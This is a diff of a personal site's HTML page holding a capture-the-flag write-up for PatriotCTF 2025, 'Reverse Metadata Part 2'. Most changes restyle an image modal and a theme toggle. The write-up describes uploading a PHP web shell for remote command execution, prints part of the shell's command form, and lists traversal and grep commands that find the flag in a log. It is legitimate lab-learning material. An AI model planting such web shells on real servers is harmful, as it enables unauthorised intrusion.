@@ -5,12 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Reverse Metadata Part 2 • syndro</title>
 
+  <!-- Theme persistence -->
   <script>
     (function() {
       const saved = localStorage.getItem('theme');
       const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
-      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
-      else document.documentElement.classList.remove('light');
+      if (saved === 'light' || (!saved && prefersLight)) {
+        document.documentElement.classList.add('light');
+      }
     })();
   </script>
 
@@ -32,7 +34,7 @@
     }
     .light body { background: #f6f8fa; color: #0d1117; }
 
-    .container { max-width: 1100px; margin: 0 auto; }
+    .container { max-width: 1100px; margin: 0 auto; position: relative; }
 
     h1 {
       font-family: 'Orbitron', sans-serif;
@@ -76,17 +78,22 @@
     }
     .light code { background: rgba(30,110,254,0.15); }
 
+    /* IMAGES - Hover + Cursor */
     img {
       max-width: 100%;
       border-radius: 16px;
       margin: 35px 0;
       box-shadow: 0 20px 60px rgba(0,0,0,0.6);
       border: 2px solid rgba(88,166,255,0.3);
-      cursor: zoom-in;
-      transition: transform 0.3s ease;
+      cursor: zoom-in !important;
+      transition: all 0.4s ease;
+      user-select: none;
     }
     .light img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
-    img:hover { transform: scale(1.02); }
+    img:hover {
+      transform: scale(1.03);
+      box-shadow: 0 25px 80px rgba(88,166,255,0.6);
+    }
 
     .flag {
       background: rgba(0,255,0,0.1);
@@ -121,48 +128,8 @@
     .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
     .light .back { color: white; }
 
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 9999;
-      left: 0; top: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.95);
-      backdrop-filter: blur(10px);
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      cursor: zoom-out;
-    }
-    .modal.active { display: flex; }
-    .modal img {
-      max-width: 95%;
-      max-height: 95vh;
-      border-radius: 16px;
-      box-shadow: 0 0 100px rgba(88,166,255,0.6);
-    }
-    .close-modal {
-      position: absolute;
-      top: 30px; right: 40px;
-      font-size: 4rem;
-      color: white;
-      background: rgba(255,255,255,0.1);
-      width: 70px; height: 70px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    .close-modal:hover { background: rgba(255,255,255,0.3); transform: scale(1.1); }
-
-    @media (max-width: 768px) {
-      h1 { font-size: 3.5rem; }
-      .back { position: static; display: block; margin: 30px auto; width: fit-content; }
-      .close-modal { top: 15px; right: 15px; font-size: 3rem; }
-    }
-   .theme-toggle {
+    /* THEME BUTTON */
+    .theme-toggle {
       position: fixed;
       top: 30px;
       right: 30px;
@@ -185,63 +152,86 @@
       transform: scale(1.08);
       box-shadow: 0 0 40px rgba(88,166,255,0.8);
     }
-.modal {
-  display: none;
-  position: fixed;
-  z-index: 10000;
-  left: 0; top: 0;
-  width: 100%; height: 100%;
-  background: rgba(0,0,0,0.96);
-  backdrop-filter: blur(12px);
-  align-items: center;
-  justify-content: center;
-  cursor: zoom-out;
-  padding: 20px;
-}
-.modal.active { display: flex; }
 
-.modal img {
-  max-width: 95%;
-  max-height: 95vh;
-  border-radius: 16px;
-  box-shadow: 0 0 100px rgba(88,166,255,0.7);
-  border: 3px solid var(--accent);
-}
+    /* PERFECT MODAL WITH ANIMATION */
+    #imageModal {
+      display: none;
+      position: fixed;
+      z-index: 10000;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.97);
+      backdrop-filter: blur(16px);
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.4s ease, visibility 0.4s;
+      padding: 20px;
+      cursor: zoom-out;
+    }
+    #imageModal.active {
+      display: flex;
+      opacity: 1;
+      visibility: visible;
+    }
+    #imageModal img {
+      max-width: 94%;
+      max-height: 94vh;
+      border-radius: 20px;
+      border: 3px solid var(--accent);
+      box-shadow: 0 0 120px rgba(88,166,255,0.8);
+      transform: scale(0.85);
+      animation: zoomIn 0.5s ease forwards;
+    }
+    @keyframes zoomIn {
+      to { transform: scale(1); }
+    }
+    .close-modal {
+      position: absolute;
+      top: 30px;
+      right: 40px;
+      font-size: 4.5rem;
+      width: 80px; height: 80px;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(10px);
+    }
+    .close-modal:hover {
+      background: rgba(255,255,255,0.3);
+      transform: scale(1.2) rotate(90deg);
+    }
 
-.close-modal {
-  position: absolute;
-  top: 30px;
-  right: 40px;
-  font-size: 4.5rem;
-  color: white;
-  background: rgba(255,255,255,0.15);
-  width: 80px; height: 80px;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  cursor: pointer;
-  transition: 0.3s;
-}
-.close-modal:hover { background: rgba(255,255,255,0.3); transform: scale(1.15); }
+    @media (max-width: 768px) {
+      h1 { font-size: 3.5rem; }
+      .back, .theme-toggle { position: static; display: block; margin: 20px auto; width: fit-content; }
+      .close-modal { top: 15px; right: 15px; font-size: 3.5rem; width: 60px; height: 60px; }
+    }
   </style>
 </head>
 <body>
-    <a href="https://syndro-1.github.io/syndro/CTF/PatriotCTF2025/patriotctf2025" class="back">Back</a>
-<div class="container">
-  <h1>Reverse Metadata Part 2</h1>
-  <div class="meta">PatriotCTF 2025 • <span>Misc</span> • syndro</div>
+
+  <a href="https://syndro-1.github.io/syndro/CTF/PatriotCTF2025/patriotctf2025" class="back">Back</a>
   <div class="theme-toggle" id="themeToggle">Theme</div>
 
-      <h2>0. The Challenge Description</h2>
+  <div class="container">
+    <h1>Reverse Metadata Part 2</h1>
+    <div class="meta">PatriotCTF 2025 • <span>Misc</span> • syndro</div>
 
+    <h2>0. The Challenge Description</h2>
     <p>It is pretty much the same thing as part1, But different flag location.</p>
     <img src="Pic/ReverseMetadataPart2/1.png" alt="Challenge Description">
 
-  <h2>1. Same Vulnerability, New Location.</h2>
-  <p>we upload our PHP shell <code>syndro.php</code> and get instant RCE again.</p>
+    <h2>1. Same Vulnerability, New Location.</h2>
+    <p>we upload our PHP shell <code>syndro.php</code> and get instant RCE again.</p>
 
-  <pre><code>&lt;html&gt;
+    <pre><code>&lt;html&gt;
 &lt;body&gt;
   &lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
   &lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
@@ -258,47 +248,64 @@
     
     <pre>Reference: https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985</pre>
 
-  <h2>2. Exploring the Filesystem</h2>
-  <p>The uploads directory is empty except our shell. Time to break out:</p>
-  <pre>ls -la ../../</pre>
+    <h2>2. Exploring the Filesystem</h2>
+    <p>The uploads directory is empty except our shell. Time to break out:</p>
+    <pre>ls -la ../../</pre>
 
-  <img src="https://github.com/user-attachments/assets/ec54d5c4-26bc-4d46-9a9e-936edc47b16a" alt="Navigating upwards">
-  <img src="https://github.com/user-attachments/assets/8152e2ba-3484-4330-8e6b-9065fab8bb06" alt="Found log directory">
+    <img src="https://github.com/user-attachments/assets/ec54d5c4-26bc-4d46-9a9e-936edc47b16a" alt="Navigating upwards">
+    <img src="https://github.com/user-attachments/assets/8152e2ba-3484-4330-8e6b-9065fab8bb06" alt="Found log directory">
 
-  <h2>3. The Winning Move</h2>
-  <p>Inside <code>processes.log</code> we finally spot the flag using the classic combo:</p>
-  <pre>strings ../../../log/ctf-monitor/processes.log | grep -i "pctf{"</pre>
+    <h2>3. The Winning Move</h2>
+    <p>Inside <code>processes.log</code> we finally spot the flag using the classic combo:</p>
+    <pre>strings ../../../log/ctf-monitor/processes.log | grep -i "pctf{"</pre>
 
-  <img src="https://github.com/user-attachments/assets/ea786880-85ef-4670-a95b-9b73253a5bfd" alt="Flag found">
+    <img src="https://github.com/user-attachments/assets/ea786880-85ef-4670-a95b-9b73253a5bfd" alt="Flag found">
 
-  <div class="flag">
-    PCTF{hidden_****}
+    <div class="flag">
+      PCTF{hidden_****}
+    </div>
+
+    <p>Always check logs. They remember everything.</p>
   </div>
 
-  <p>Always check logs. They remember everything.</p>
-</div>
-
   <!-- IMAGE ZOOM MODAL -->
-<div id="imageModal" class="modal">
-  <span class="close-modal">×</span>
-  <img id="modalImage" src="" alt="Zoomed image">
-</div>
+  <div id="imageModal" class="modal">
+    <span class="close-modal">×</span>
+    <img id="modalImage" src="" alt="Zoomed image">
+  </div>
+
   <script>
+    const modal = document.getElementById('imageModal');
+    const modalImg = document.getElementById('modalImage');
+
+    // Open modal
     document.querySelectorAll('img').forEach(img => {
-      if (!img.closest('.modal')) {
-        img.onclick = () => {
-          document.getElementById('modalImage').src = img.src;
-          document.getElementById('imageModal').classList.add('active');
-        };
+      if (img.closest('#imageModal')) return;
+      img.onclick = () => {
+        modalImg.src = img.src;
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      };
+    });
+
+    // Close modal
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal || e.target.classList.contains('close-modal')) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
       }
     });
-    document.getElementById('imageModal').onclick = function(e) {
-      if (e.target === this || e.target.classList.contains('close-modal')) {
-        this.classList.remove('active');
-      }
-    };
 
-    document.getElementById('themeToggle').addEventListener('click', () => {
+    // ESC key
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modal.classList.contains('active')) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+    });
+
+    // Theme toggle
+    document.getElementById('themeToggle')?.addEventListener('click', () => {
       document.documentElement.classList.toggle('light');
       localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
     });
